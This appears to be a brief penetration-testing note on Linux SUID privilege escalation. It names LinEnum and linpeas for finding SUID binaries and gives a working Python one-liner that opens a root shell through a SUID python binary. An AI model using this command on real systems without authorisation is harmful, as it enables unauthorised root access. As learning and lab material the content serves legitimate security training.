# SUID

To escalate privileges you need a binary with SUID-bit set.
Find this with [LinEnum](linenum.md) or [linpeas](linpeas.md).

If it's `python`, run following to become root:

    python -c 'import os; os.execl("/bin/sh", "sh", "-p")'